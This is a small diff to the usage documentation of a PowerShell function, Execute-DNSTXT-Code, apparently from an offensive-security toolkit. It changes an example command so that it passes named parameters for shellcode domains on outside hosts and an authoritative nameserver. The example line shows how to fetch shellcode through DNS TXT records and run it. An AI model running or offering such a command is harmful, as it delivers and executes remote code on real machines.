@@ -30,7 +30,7 @@ PS > Execute-DNSTXT-Code
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com -SubDomains 5
+PS > Execute-DNSTXT-Code -ShellCode32 32.alteredsecurity.com -ShellCode64 64.alteredsecurity.com -AuthNS ns8.zoneedit.com -SubDomains 5
 Use above from non-interactive shell.
 
 .LINK
